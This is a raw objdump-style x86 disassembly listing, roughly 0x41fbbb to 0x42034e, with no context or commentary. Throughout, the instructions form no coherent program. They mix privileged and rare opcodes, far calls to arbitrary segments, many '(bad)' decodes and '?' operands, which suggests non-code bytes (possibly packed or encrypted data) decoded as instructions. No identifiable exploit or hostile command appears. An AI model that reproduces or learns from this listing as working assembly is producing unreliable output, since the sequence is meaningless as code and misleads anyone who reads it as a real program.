  41fbbb:	lods   al,BYTE PTR ds:[esi]
  41fbbc:	push   edi
  41fbbd:	ret    0xcf24
  41fbc0:	lods   al,BYTE PTR ds:[esi]
  41fbc1:	imul   edi,ecx,0x1dac5ae1
  41fbc7:	pop    edx
  41fbc8:	into   
  41fbc9:	inc    esi
  41fbca:	mov    edx,0x14d04603
  41fbcf:	push   ebp
  41fbd0:	clc    
  41fbd1:	outs   dx,DWORD PTR ds:[esi]
  41fbd2:	push   ebp
  41fbd3:	scas   al,BYTE PTR es:[edi]
  41fbd4:	sbb    BYTE PTR [ebp+0x64],bh
  41fbd7:	into   
  41fbd8:	add    ebx,0x3261f1e
  41fbde:	xchg   ecx,eax
  41fbdf:	int    0xd5
  41fbe1:	adc    eax,0x77f69982
  41fbe6:	mov    ebp,0x325df303
  41fbeb:	or     al,0x25
  41fbed:	mov    al,ds:0x46c82d71
  41fbf2:	test   DWORD PTR [edx],edi
  41fbf4:	hlt    
  41fbf5:	push   edx
  41fbf6:	aad    0x17
  41fbf8:	fst    DWORD PTR [ecx+0x20ec0642]
  41fbfe:	inc    esp
  41fc00:	call   0xce76:0xcbea69d7
  41fc07:	iret   
  41fc08:	sub    al,0x70
  41fc0a:	cld    
  41fc0b:	xchg   esp,eax
  41fc0c:	mov    bh,0xff
  41fc0e:	sbb    DWORD PTR [edx-0xafdb2c],edi
  41fc14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fc15:	push   edi
  41fc16:	mov    WORD PTR [edx+0x2162ee60],ds
  41fc1c:	das    
  41fc1d:	sti    
  41fc1e:	xor    eax,0xac631496
  41fc23:	and    al,0x79
  41fc25:	lock xchg ebp,eax
  41fc27:	jl     0x41fbb1
  41fc29:	shr    ch,cl
  41fc2b:	push   edi
  41fc2c:	or     ebp,DWORD PTR [eax+0xed65106]
  41fc32:	mov    al,ds:0x491dd1e
  41fc37:	mov    dl,0x2
  41fc39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fc3a:	xchg   DWORD PTR [ecx-0x9],ebp
  41fc3d:	push   eax
  41fc3e:	lahf   
  41fc3f:	popf   
  41fc40:	and    BYTE PTR [ecx+0x31a443b9],bh
  41fc46:	rcr    DWORD PTR [ebx+edi*8+0x8626b35],0xa7
  41fc4e:	push   esi
  41fc4f:	das    
  41fc50:	mov    ebp,0x618bf51e
  41fc55:	dec    esi
  41fc56:	ins    BYTE PTR es:[edi],dx
  41fc57:	push   eax
  41fc58:	inc    esp
  41fc59:	daa    
  41fc5a:	test   al,0x31
  41fc5c:	(bad)  
  41fc5d:	fstp   DWORD PTR [edi-0x1f7ef87b]
  41fc63:	in     eax,0xdc
  41fc65:	cmp    BYTE PTR [edx+eiz*2],bh
  41fc68:	mov    ebp,0xf11e216d
  41fc6d:	outs   dx,DWORD PTR ds:[esi]
  41fc6e:	dec    eax
  41fc6f:	mov    al,0x57
  41fc71:	xchg   edi,eax
  41fc72:	cmp    esi,DWORD PTR [edi]
  41fc74:	jo     0x41fcab
  41fc76:	xor    eax,0x6daad11b
  41fc7b:	add    al,BYTE PTR [ebp-0x65]
  41fc7e:	sbb    al,0xe
  41fc80:	xchg   esi,eax
  41fc81:	and    DWORD PTR [edi-0x6007fb83],ecx
  41fc87:	push   ds
  41fc88:	add    esi,DWORD PTR [edx-0x5d1f353c]
  41fc8e:	push   ecx
  41fc8f:	xor    eax,0xe256ebb4
  41fc94:	lea    eax,[edi+ebx*2-0x633e62c9]
  41fc9b:	inc    edi
  41fc9c:	mov    esp,0xf49383e5
  41fca1:	mov    ds:0x5e69b8b9,al
  41fca6:	outs   dx,BYTE PTR ds:[esi]
  41fca7:	cmp    edi,esp
  41fca9:	out    dx,al
  41fcaa:	mov    edx,0xd22e88dc
  41fcaf:	sahf   
  41fcb0:	fcom   DWORD PTR [edi]
  41fcb2:	xor    ah,ch
  41fcb4:	call   0x609835cf
  41fcb9:	sbb    eax,DWORD PTR [ecx+0x65400cd2]
  41fcbf:	out    0x6,al
  41fcc1:	inc    esi
  41fcc2:	mul    BYTE PTR [edx-0x334ddec5]
  41fcc8:	push   esp
  41fcc9:	pop    ds
  41fcca:	mov    al,0x52
  41fccc:	dec    ebp
  41fccd:	sbb    eax,0x91badfd1
  41fcd2:	stc    
  41fcd3:	pop    ds
  41fcd4:	das    
  41fcd5:	lds    eax,FWORD PTR [ecx+0x7d]
  41fcd8:	enter  0xf36c,0xfa
  41fcdc:	sub    esp,eax
  41fcde:	mov    cl,0xd6
  41fce0:	repz inc esp
  41fce2:	addr16 jge 0x41fd1c
  41fce5:	repnz pop ebp
  41fce7:	add    eax,0x31f4fa87
  41fcec:	sub    BYTE PTR [eax-0x52],dh
  41fcef:	cmp    esi,DWORD PTR [edx+0x4fcb3096]
  41fcf5:	or     BYTE PTR [esi-0x76],0xe
  41fcf9:	addr16 push ecx
  41fcfb:	adc    cl,dh
  41fcfd:	loope  0x41fd02
  41fcff:	aam    0xf3
  41fd01:	jbe    0x41fc8d
  41fd03:	cmp    esi,DWORD PTR ds:0xe9d6c007
  41fd09:	or     DWORD PTR [ebx+0x50],0xffffffd4
  41fd0d:	lods   al,BYTE PTR ds:[esi]
  41fd0e:	lea    ebx,[edi-0x32]
  41fd11:	int    0xd6
  41fd13:	fmul   DWORD PTR [ebx+0x6527a1c3]
  41fd19:	sbb    al,0xae
  41fd1b:	loope  0x41fd69
  41fd1d:	adc    DWORD PTR [ebx+eiz*8-0x77],ecx
  41fd21:	mov    ds:0x42834737,al
  41fd26:	icebp  
  41fd27:	push   ds
  41fd28:	mov    WORD PTR [eax+0x6d],cs
  41fd2b:	pusha  
  41fd2c:	(bad)  
  41fd2d:	mov    al,0x95
  41fd2f:	adc    ah,BYTE PTR [edi-0x3e0be089]
  41fd35:	out    0x36,al
  41fd37:	ins    DWORD PTR es:[edi],dx
  41fd38:	mov    cl,BYTE PTR [ebp+0x7320da95]
  41fd3e:	mov    ebx,0xf8e26a45
  41fd43:	cmc    
  41fd44:	push   edx
  41fd45:	int    0x10
  41fd47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fd48:	jnp    0x41fd78
  41fd4a:	daa    
  41fd4b:	mov    al,0x4c
  41fd4d:	jno    0x41fd72
  41fd4f:	test   DWORD PTR [edi-0x72],edx
  41fd52:	pop    ecx
  41fd53:	mov    al,0xa1
  41fd55:	inc    ecx
  41fd56:	das    
  41fd57:	out    0xf9,al
  41fd59:	pop    esi
  41fd5a:	jbe    0x41fd83
  41fd5c:	test   DWORD PTR [edi+0x3e],ecx
  41fd5f:	jle    0x41fd70
  41fd61:	jge    0x41fcf2
  41fd63:	mov    edi,0x44e0b817
  41fd68:	xchg   edx,eax
  41fd69:	repz data16 ja 0x41fd8d
  41fd6d:	mov    ebp,DWORD PTR [esi-0x1f06a73e]
  41fd73:	pop    edi
  41fd74:	ret    0xc719
  41fd77:	xchg   ebx,eax
  41fd78:	imul   ecx,esp,0xaf30abb9
  41fd7e:	push   ss
  41fd7f:	cmp    eax,0xb79561d
  41fd84:	scas   al,BYTE PTR es:[edi]
  41fd85:	inc    ebp
  41fd86:	enter  0x8b35,0x73
  41fd8a:	mov    cr3,ebp
  41fd8d:	sub    al,BYTE PTR [edi-0x75]
  41fd90:	rcl    ecx,1
  41fd92:	das    
  41fd93:	scas   eax,DWORD PTR es:[edi]
  41fd94:	shl    BYTE PTR [ebx+0x6f9ea1a5],1
  41fd9a:	xchg   edi,eax
  41fd9b:	xor    DWORD PTR [edx],0xd62ab070
  41fda1:	pop    edx
  41fda2:	adc    eax,0xf529cd70
  41fda7:	neg    DWORD PTR ds:0x58d7c41
  41fdad:	dec    esi
  41fdae:	dec    edx
  41fdaf:	mov    dh,ch
  41fdb1:	stc    
  41fdb2:	sub    al,0xdb
  41fdb4:	je     0x41fdc4
  41fdb6:	test   al,0xbf
  41fdb8:	push   bp
  41fdba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fdbb:	jmp    0xe70c:0x52ca60bb
  41fdc2:	push   eax
  41fdc3:	push   ebx
  41fdc4:	ins    DWORD PTR es:[edi],dx
  41fdc5:	mov    ah,0xf3
  41fdc7:	fwait
  41fdc8:	fwait
  41fdc9:	dec    ebp
  41fdca:	or     al,0x55
  41fdcc:	pop    ebx
  41fdcd:	pop    ebx
  41fdce:	hlt    
  41fdcf:	mov    dl,0x64
  41fdd1:	push   ebp
  41fdd2:	cmp    ebp,DWORD PTR ds:0xfb4b59b4
  41fdd8:	inc    BYTE PTR [ebx]
  41fdda:	aas    
  41fddb:	pop    edi
  41fddc:	fwait
  41fddd:	inc    eax
  41fdde:	fist   WORD PTR [ebx+0x215598d8]
  41fde4:	xchg   esi,eax
  41fde5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fde6:	sub    bh,BYTE PTR [ebp+eax*4+0x5825335b]
  41fded:	mov    edi,0x3049fec7
  41fdf2:	dec    ebp
  41fdf3:	mov    ebp,DWORD PTR [ebp+0x18]
  41fdf6:	jo     0x41fe2f
  41fdf8:	and    DWORD PTR es:[ebx+ebx*1-0x62],eax
  41fdfd:	lods   al,BYTE PTR ds:[esi]
  41fdfe:	(bad)  
  41fdff:	fcomp  DWORD PTR [edx-0x1af1c113]
  41fe05:	int    0xbc
  41fe07:	mov    ah,bl
  41fe09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fe0a:	add    eax,0x1c5e2f59
  41fe0f:	or     DWORD PTR [ecx-0x75936c0d],0x8ae734b
  41fe19:	loopne 0x41fe46
  41fe1b:	push   esp
  41fe1c:	leave  
  41fe1d:	mov    ds:0x33cccf92,eax
  41fe22:	test   DWORD PTR [ebx+0x2fd29d5f],eax
  41fe28:	sbb    bl,BYTE PTR [ebp-0x432941ca]
  41fe2e:	addr16 out dx,al
  41fe30:	adc    ah,dh
  41fe32:	mov    bh,dl
  41fe34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fe35:	add    BYTE PTR [esi],bh
  41fe37:	out    0x64,eax
  41fe39:	cwde   
  41fe3a:	pop    ds
  41fe3b:	sub    ebp,DWORD PTR [eax+0x5fc71552]
  41fe41:	sub    BYTE PTR [eax+0x59],bl
  41fe44:	pop    esi
  41fe45:	push   ebx
  41fe46:	cmc    
  41fe47:	test   BYTE PTR [ecx+0x41],bl
  41fe4a:	mov    gs,WORD PTR [ebx-0x839aed1]
  41fe50:	(bad)  
  41fe51:	call   0xb502e031
  41fe56:	push   edx
  41fe57:	cmp    WORD PTR [ecx+0x42],ax
  41fe5b:	pop    ds
  41fe5c:	nop
  41fe5d:	int3   
  41fe5e:	(bad)  
  41fe5f:	sub    DWORD PTR [edi-0x49c0a912],esi
  41fe65:	(bad)  
  41fe66:	mov    esp,0x839c71d3
  41fe6b:	and    al,0x34
  41fe6d:	in     al,0xb
  41fe6f:	push   ebp
  41fe70:	jp     0x41fe2d
  41fe72:	push   edi
  41fe73:	or     esi,DWORD PTR [eax]
  41fe75:	lea    esi,[ebx+0x58]
  41fe78:	std    
  41fe79:	test   DWORD PTR [ebp+eiz*8-0x78],0xa1e1e205
  41fe81:	int    0x4c
  41fe83:	add    BYTE PTR [eax],dl
  41fe85:	test   DWORD PTR [edi+0x9360ed0],ebx
  41fe8b:	push   ss
  41fe8c:	push   ebx
  41fe8d:	sbb    eax,0x1d2f2597
  41fe92:	xchg   BYTE PTR [edx],cl
  41fe94:	icebp  
  41fe95:	dec    ecx
  41fe96:	pop    esi
  41fe97:	mov    edx,0xb4424fe7
  41fe9c:	repnz hlt 
  41fe9e:	test   eax,0xc1b552ae
  41fea3:	and    al,0x37
  41fea5:	sub    BYTE PTR [ebx-0x2dfb1a36],0x43
  41feac:	aaa    
  41fead:	fild   WORD PTR ds:0xd7b9e3a8
  41feb3:	xchg   esp,eax
  41feb4:	lahf   
  41feb5:	out    0xd1,al
  41feb7:	mov    ds:0x18032caf,al
  41febc:	inc    ebx
  41febd:	adc    eax,0x1c3b410a
  41fec2:	jle    0x41fed1
  41fec4:	(bad)  
  41fec5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fec6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fec7:	or     DWORD PTR [esi],eax
  41fec9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41feca:	or     eax,0xf60f6e5b
  41fecf:	pushf  
  41fed0:	je     0x41ff1d
  41fed2:	lods   eax,DWORD PTR ds:[esi]
  41fed3:	jmp    0x89ddc6ed
  41fed8:	mov    dl,0xa0
  41feda:	dec    ebp
  41fedb:	pusha  
  41fedc:	mov    eax,DWORD PTR [ecx]
  41fede:	jno    0x41fedb
  41fee0:	inc    ecx
  41fee1:	xor    bl,BYTE PTR [ecx]
  41fee3:	cdq    
  41fee4:	ret    0x6337
  41fee7:	cmp    eax,eax
  41fee9:	fisubr WORD PTR [ebx+0x5a6c4348]
  41feef:	int    0x60
  41fef1:	sub    dh,BYTE PTR [eax]
  41fef3:	mov    edx,DWORD PTR [edi]
  41fef5:	out    0x4a,al
  41fef7:	bound  eax,QWORD PTR [edx-0x574cca10]
  41fefd:	push   edi
  41fefe:	push   es
  41feff:	out    dx,eax
  41ff00:	fdivr  st(2),st
  41ff02:	test   DWORD PTR [ebp+0x25],0x4afe578e
  41ff09:	inc    esp
  41ff0a:	xchg   esi,eax
  41ff0b:	sbb    al,0x49
  41ff0d:	js     0x41ff58
  41ff0f:	pop    ds
  41ff10:	ret    0x851
  41ff13:	into   
  41ff14:	popf   
  41ff15:	and    DWORD PTR [eax],0x2e3a4ba2
  41ff1b:	sbb    eax,0x6c93c5cc
  41ff20:	inc    esi
  41ff21:	call   0xa076:0x6f28f578
  41ff28:	int3   
  41ff29:	ins    DWORD PTR es:[edi],dx
  41ff2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ff2b:	push   edi
  41ff2c:	push   0xffffff96
  41ff2e:	(bad)  
  41ff2f:	jns    0x41ff93
  41ff31:	add    BYTE PTR [esi],bh
  41ff33:	mov    ebp,0xb9deeb5b
  41ff38:	inc    ecx
  41ff39:	dec    ecx
  41ff3a:	pop    ds
  41ff3b:	xor    DWORD PTR [edx],esi
  41ff3d:	and    ebx,0x30427f2
  41ff43:	cwde   
  41ff44:	xor    esp,DWORD PTR [esi+0x30]
  41ff47:	cmp    eax,0xa7bcf684
  41ff4c:	inc    ebx
  41ff4d:	in     al,0x27
  41ff4f:	fisubr DWORD PTR [eax-0x14]
  41ff52:	and    al,0x94
  41ff54:	dec    esp
  41ff55:	or     edi,DWORD PTR [edx]
  41ff57:	(bad)  
  41ff58:	(bad)  
  41ff59:	mov    ds:0x8454b5d,eax
  41ff5e:	mov    ebp,0x1b71d3fb
  41ff63:	push   ebp
  41ff64:	loopne 0x41ff1d
  41ff66:	push   ss
  41ff67:	adc    dl,BYTE PTR [edx-0x7e]
  41ff6a:	add    bh,BYTE PTR [ecx+0x3ccdf591]
  41ff70:	dec    eax
  41ff71:	xor    eax,0xb07f7675
  41ff76:	push   ds
  41ff77:	scas   al,BYTE PTR es:[edi]
  41ff78:	lea    edx,[esi]
  41ff7a:	ins    BYTE PTR es:[di],dx
  41ff7c:	lds    esi,FWORD PTR [esi-0x6564e8d3]
  41ff82:	mov    dl,0xa1
  41ff84:	lea    ebx,[edi-0x36]
  41ff87:	cmp    al,0x44
  41ff89:	std    
  41ff8a:	inc    ebx
  41ff8b:	loopne 0x41ff46
  41ff8d:	jmp    0x41ff17
  41ff8f:	and    eax,0xb856f821
  41ff94:	in     eax,0xf7
  41ff96:	xor    al,0x12
  41ff98:	repnz push ecx
  41ff9a:	pop    ebp
  41ff9b:	cmc    
  41ff9c:	pop    ecx
  41ff9d:	das    
  41ff9e:	sbb    DWORD PTR [ecx],edi
  41ffa0:	jle    0x41ffdd
  41ffa2:	inc    esi
  41ffa3:	adc    eax,0xbd3b2282
  41ffa8:	jp     0x41ff95
  41ffaa:	and    edx,0x11b6804
  41ffb0:	or     bl,cl
  41ffb2:	fdiv   QWORD PTR ds:0x41151779
  41ffb8:	cmp    al,0x49
  41ffba:	mov    eax,ds:0x491e0ed4
  41ffbf:	popa   
  41ffc0:	inc    ebp
  41ffc1:	mov    al,0x49
  41ffc3:	jge    0x41ffa1
  41ffc5:	cdq    
  41ffc6:	cs ret 
  41ffc8:	stos   DWORD PTR es:[edi],eax
  41ffc9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ffca:	ret    0x6095
  41ffcd:	or     BYTE PTR [eax+0x6a],al
  41ffd0:	bound  esp,QWORD PTR [eax+edi*1]
  41ffd3:	cdq    
  41ffd4:	in     eax,0x1f
  41ffd6:	fild   DWORD PTR [ebp+0x68]
  41ffd9:	mov    dl,0x45
  41ffdb:	push   0xc0e54e74
  41ffe0:	push   ss
  41ffe1:	inc    esp
  41ffe2:	inc    ecx
  41ffe3:	mov    dl,0x2d
  41ffe5:	in     al,dx
  41ffe6:	adc    BYTE PTR [edi+edx*1],dh
  41ffe9:	loope  0x41ffe8
  41ffeb:	inc    ecx
  41ffec:	ins    DWORD PTR es:[edi],dx
  41ffed:	xor    BYTE PTR [eax+0xd58d474],cl
  41fff3:	or     dh,BYTE PTR [edx]
  41fff5:	inc    esi
  41fff6:	adc    eax,esi
  41fff8:	sahf   
  41fff9:	mov    ds:0x2daba8a1,al
  41fffe:	cdq    
  41ffff:	jmp    0x42001a
  420001:	mov    bh,0x2c
  420003:	dec    eax
  420004:	sti    
  420005:	push   eax
  420006:	xor    al,0x1e
  420008:	add    DWORD PTR [edi+0x30],ebx
  42000b:	jl     0x41ffdf
  42000d:	mov    al,ds:0x19023cce
  420012:	scas   eax,DWORD PTR es:[edi]
  420013:	enter  0x22f4,0xd8
  420017:	shl    DWORD PTR [ebp-0x11dfe7eb],1
  42001d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42001e:	and    cl,BYTE PTR [edi-0x52]
  420021:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420022:	lock cdq 
  420024:	jns    0x42006d
  420026:	cmp    eax,0x981a083b
  42002b:	scas   al,BYTE PTR es:[edi]
  42002c:	mov    WORD PTR [esi],gs
  42002e:	pop    edx
  42002f:	scas   eax,DWORD PTR es:[edi]
  420030:	cmp    BYTE PTR [edx-0x7b4e2f34],bl
  420036:	inc    eax
  420037:	inc    edi
  420038:	sub    eax,0xdadf81e
  42003d:	pop    edi
  42003e:	hlt    
  42003f:	mov    edi,0x95dd9589
  420044:	xor    BYTE PTR [edx],cl
  420046:	mov    ds:0xe36fe31c,eax
  42004b:	or     cl,BYTE PTR [ecx]
  42004d:	mov    edx,DWORD PTR [edi]
  42004f:	mov    WORD PTR [eax+0x12],?
  420052:	stos   BYTE PTR es:[edi],al
  420053:	mov    ah,0x40
  420055:	inc    ebp
  420056:	cs iret 
  420058:	or     BYTE PTR [esi],al
  42005a:	sub    ebp,DWORD PTR [ebx-0x77]
  42005d:	(bad)  
  42005e:	fbld   TBYTE PTR ds:0xf16cf2cb
  420064:	mov    ebx,0x97e29926
  420069:	sub    DWORD PTR [ebx-0x5],ebx
  42006c:	jg     0x420021
  42006e:	push   ss
  42006f:	inc    eax
  420070:	mov    ebx,0x182c9c5d
  420075:	loop   0x4200dd
  420077:	test   DWORD PTR [esi],edi
  420079:	(bad)  
  42007b:	unpcklps xmm7,XMMWORD PTR [edi]
  42007e:	imul   BYTE PTR [eax]
  420080:	mov    ds:0xa615e483,al
  420085:	and    bh,ah
  420087:	test   DWORD PTR [ebp+0x2f],ebp
  42008a:	xor    ebp,DWORD PTR [eax]
  42008c:	xor    eax,DWORD PTR [ebp-0x3e2a669]
  420092:	or     BYTE PTR [ecx],0xaa
  420095:	jl     0x420091
  420097:	push   edi
  420098:	mov    ?,edi
  42009a:	inc    esp
  42009b:	dec    esp
  42009c:	mov    al,ds:0x812bf43a
  4200a1:	sub    eax,0x46ae343b
  4200a6:	inc    edi
  4200a7:	cdq    
  4200a8:	sub    dh,BYTE PTR [eax-0x62]
  4200ab:	out    0x2a,al
  4200ad:	mov    eax,0x7d296b6f
  4200b2:	pop    ebx
  4200b3:	and    BYTE PTR [esp+ebx*8-0x4e2077fb],0x78
  4200bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4200bc:	(bad)  
  4200bd:	int    0xdb
  4200bf:	nop
  4200c0:	mov    bh,0xf4
  4200c2:	fwait
  4200c3:	sbb    al,BYTE PTR ss:[edi+0x681fea47]
  4200ca:	mov    edi,0xa95b2919
  4200cf:	mov    edx,0x131985cd
  4200d4:	(bad)
  4200d7:	xchg   ebp,eax
  4200d8:	pushf  
  4200d9:	ror    edi,1
  4200db:	leave  
  4200dc:	enter  0xeaaa,0x2d
  4200e0:	and    BYTE PTR [eax],ch
  4200e2:	popa   
  4200e3:	xor    BYTE PTR [esp+edx*1],al
  4200e6:	adc    BYTE PTR [esi-0xc],0x4a
  4200ea:	outs   dx,BYTE PTR ds:[esi]
  4200eb:	adc    eax,DWORD PTR [esi-0xa8ce38d]
  4200f1:	jp     0x420082
  4200f3:	je     0x4200de
  4200f5:	test   al,0x45
  4200f8:	xor    BYTE PTR [eax-0x8],al
  4200fb:	fwait
  4200fc:	jne    0x420147
  4200fe:	bound  ebx,QWORD PTR [eax-0x22857a84]
  420104:	cmp    eax,0x9e0624b8
  420109:	and    ebp,esp
  42010b:	dec    edx
  42010c:	and    BYTE PTR [edi],bh
  42010e:	daa    
  42010f:	mov    ebx,esi
  420111:	pop    ss
  420112:	fdiv   QWORD PTR [ecx*4+0x5973930a]
  420119:	clc    
  42011a:	xor    ch,BYTE PTR [ebx+edx*2+0x5a312632]
  420121:	and    BYTE PTR [ebx+0x6d],ch
  420124:	dec    edx
  420125:	call   DWORD PTR [ecx+0x603ee280]
  42012b:	fdiv   QWORD PTR [ebp+0xc]
  42012e:	xor    esp,edx
  420130:	and    DWORD PTR [edx+0x6eb3799b],ecx
  420136:	xchg   esi,eax
  420137:	ja     0x420184
  420139:	mov    eax,0x6a39978e
  42013e:	ins    DWORD PTR es:[edi],dx
  42013f:	push   ss
  420140:	jb     0x4200f1
  420142:	mov    esp,0x3cea7924
  420147:	stos   BYTE PTR es:[edi],al
  420148:	mov    cl,0xf1
  42014a:	dec    ebp
  42014b:	mov    eax,0x27dae835
  420150:	jge    0x4201a3
  420152:	or     ecx,DWORD PTR [ecx]
  420154:	ret    0x90e6
  420157:	add    DWORD PTR [edi-0x23b855ad],ebp
  42015d:	into   
  42015e:	stos   BYTE PTR es:[edi],al
  42015f:	and    BYTE PTR [ecx+0x1e],cl
  420162:	ficomp DWORD PTR [eax-0x54427473]
  420168:	sub    al,0xa5
  42016a:	and    eax,0xd84c3d58
  42016f:	dec    ebx
  420170:	sub    DWORD PTR [esp+ebx*4+0x6932b41a],ecx
  420177:	outs   dx,BYTE PTR ds:[esi]
  420178:	add    DWORD PTR [esi+0x29],ecx
  42017b:	cmp    DWORD PTR [ebp-0x51],edi
  42017e:	xchg   ebp,eax
  42017f:	add    ah,ch
  420181:	push   0x1d339f09
  420186:	imul   ebx,DWORD PTR es:[ebx+0x264c3a6e],0xffffffb6
  42018e:	adc    al,0x14
  420190:	scas   eax,DWORD PTR es:[edi]
  420191:	ins    BYTE PTR es:[edi],dx
  420192:	adc    BYTE PTR [ebx+0x4b003da5],bh
  420198:	mov    bh,0x1a
  42019a:	mov    WORD PTR [ecx+edi*4-0x49a73fb5],cs
  4201a1:	mov    cl,0x97
  4201a3:	xor    DWORD PTR [eax],ebp
  4201a5:	out    0xc9,al
  4201a7:	push   esi
  4201a8:	pop    ds
  4201a9:	fs dec ecx
  4201ab:	mov    ds:0x291baad1,al
  4201b0:	inc    esi
  4201b1:	dec    ebx
  4201b2:	ins    DWORD PTR es:[edi],dx
  4201b3:	mov    ah,0x7
  4201b5:	xchg   edi,eax
  4201b6:	imul   esp,ecx,0xc734b791
  4201bc:	scas   eax,DWORD PTR es:[edi]
  4201bd:	fldcw  WORD PTR [edi]
  4201bf:	push   cs
  4201c0:	dec    edx
  4201c1:	test   al,0xde
  4201c3:	sub    eax,0xe0e3f982
  4201c8:	test   al,0x79
  4201ca:	daa    
  4201cb:	or     al,0x4c
  4201cd:	adc    eax,0x1dff1bb5
  4201d2:	sahf   
  4201d3:	sub    eax,0x2192fd3
  4201d8:	mov    ecx,0x8906558a
  4201dd:	les    esi,FWORD PTR [eax+0x1b]
  4201e0:	jp     0x42017f
  4201e2:	adc    al,0xb0
  4201e4:	mov    ds,WORD PTR [ebx]
  4201e6:	out    0xb8,eax
  4201e8:	xchg   edx,eax
  4201e9:	sub    eax,0xc37906f6
  4201ee:	leave  
  4201ef:	ja     0x420184
  4201f1:	xchg   esp,eax
  4201f2:	mov    eax,ds:0xfab4bba9
  4201f7:	pop    ebx
  4201f8:	pop    esi
  4201f9:	mov    edi,0xbb602e43
  4201fe:	mov    WORD PTR [edi-0xe],?
  420201:	hlt    
  420202:	push   es
  420203:	das    
  420204:	dec    ebx
  420205:	mov    ecx,DWORD PTR [ecx+0x372ee62a]
  42020b:	call   0x1d283c72
  420210:	arpl   si,di
  420212:	add    ecx,DWORD PTR [ebp-0x71c5a017]
  420218:	test   al,0xfb
  42021a:	xchg   esi,eax
  42021b:	push   ebp
  42021c:	gs push 0x6d
  42021f:	xchg   esi,eax
  420220:	sar    DWORD PTR [ecx-0x1e193bc4],0x6c
  420227:	xor    esp,ebp
  420229:	adc    al,0xf3
  42022b:	xor    al,0x1c
  42022d:	mov    ebp,0x600c72af
  420232:	in     al,0x15
  420234:	jns    0x4202a8
  420236:	(bad)  
  420237:	out    0x1,eax
  420239:	adc    DWORD PTR [ecx+0x3779c909],0x1907ed52
  420243:	fadd   QWORD PTR [ebx+ecx*4]
  420246:	dec    eax
  420247:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420248:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420249:	push   ebp
  42024a:	sub    al,0x31
  42024c:	popf   
  42024d:	xchg   edi,eax
  42024e:	call   0x4b128370
  420253:	fldcw  WORD PTR [ecx+0x19bd8788]
  420259:	adc    DWORD PTR [edi-0x6ec6609],ebx
  42025f:	mov    bh,0x2b
  420261:	mov    esi,ebx
  420263:	xchg   DWORD PTR [eax-0x13],edi
  420266:	fwait
  420267:	jne    0x420287
  420269:	retf   
  42026a:	push   ss
  42026b:	and    eax,0xd7c1405
  420270:	inc    eax
  420271:	retf   
  420272:	cld    
  420273:	repz mov ds:0x58abfb62,al
  420279:	pusha  
  42027a:	dec    ebp
  42027b:	jecxz  0x4202c4
  42027d:	cmc    
  42027e:	or     ebx,edx
  420280:	xchg   ecx,eax
  420281:	mov    edi,0xa2c8560b
  420286:	in     eax,dx
  420287:	or     al,0x91
  420289:	je     0x420304
  42028b:	inc    edx
  42028c:	test   DWORD PTR [ebx+ebx*4-0x48],edx
  420290:	cmp    eax,0x98a59653
  420295:	shl    DWORD PTR [eax-0x57],0x87
  420299:	pushf  
  42029a:	fmul   DWORD PTR [edi-0x7f]
  42029d:	or     al,0x21
  42029f:	jne    0x42028b
  4202a1:	sahf   
  4202a2:	test   BYTE PTR [edi+0x5f116c60],bl
  4202a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4202a9:	out    dx,eax
  4202aa:	jmp    0xf220311e
  4202af:	and    eax,0xd980cb03
  4202b4:	sbb    BYTE PTR [ebx],0xce
  4202b7:	inc    ebp
  4202b8:	cwde   
  4202b9:	les    esi,FWORD PTR [eax]
  4202bb:	sbb    eax,0x82568209
  4202c0:	mov    dl,0xb6
  4202c2:	mov    BYTE PTR ds:[ecx],0x82
  4202c6:	push   0x46d5b6e1
  4202cb:	push   ds
  4202cc:	data16 fst QWORD PTR [edi+0x1ef760f1]
  4202d3:	stos   DWORD PTR es:[edi],eax
  4202d4:	jns    0x42027c
  4202d6:	pop    eax
  4202d7:	sbb    eax,0xe3ab7b16
  4202dc:	mov    edx,0xe63e842a
  4202e1:	or     BYTE PTR [edx+0x17],al
  4202e4:	daa    
  4202e5:	pop    esp
  4202e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4202e7:	lds    ebp,FWORD PTR [ecx-0x4a8b46a9]
  4202ed:	jo     0x420360
  4202ef:	call   0x6d94263f
  4202f4:	sbb    BYTE PTR ss:[eax],0xb0
  4202f8:	push   ss
  4202f9:	loopne 0x4202f3
  4202fb:	push   esp
  4202fc:	jmp    0xa877:0xb93a6426
  420303:	repz xchg esi,eax
  420305:	xchg   edx,eax
  420306:	pushf  
  420307:	xor    DWORD PTR [ecx],0x3b3b2d25
  42030d:	adc    eax,0xe380e5d2
  420312:	std    
  420313:	scas   al,BYTE PTR es:[edi]
  420314:	cmp    al,0xad
  420316:	out    dx,eax
  420317:	test   eax,0x37c30962
  42031c:	int3   
  42031d:	(bad)  
  42031e:	fucomip st,st(2)
  420320:	out    dx,al
  420321:	rcr    BYTE PTR [ecx+edi*1+0x17],cl
  420325:	cwde   
  420326:	mov    WORD PTR [edx-0x34],fs
  420329:	mov    ebp,0x7c4e7185
  42032e:	mov    WORD PTR [edi],?
  420330:	or     DWORD PTR [ebx-0xb83a3c],esp
  420336:	sub    esp,ecx
  420338:	fmul   DWORD PTR [edx-0x1]
  42033b:	lods   eax,DWORD PTR ds:[esi]
  42033c:	dec    edi
  42033d:	adc    DWORD PTR [edi],ecx
  42033f:	sbb    DWORD PTR [edx+ecx*1+0x5371ed8d],esi
  420346:	jge    0x42032e
  420348:	(bad)  
  420349:	mov    bl,0xd7
  42034b:	pop    edx
  42034c:	icebp  
  42034d:	into   
  42034e:	mov    ch,0x35
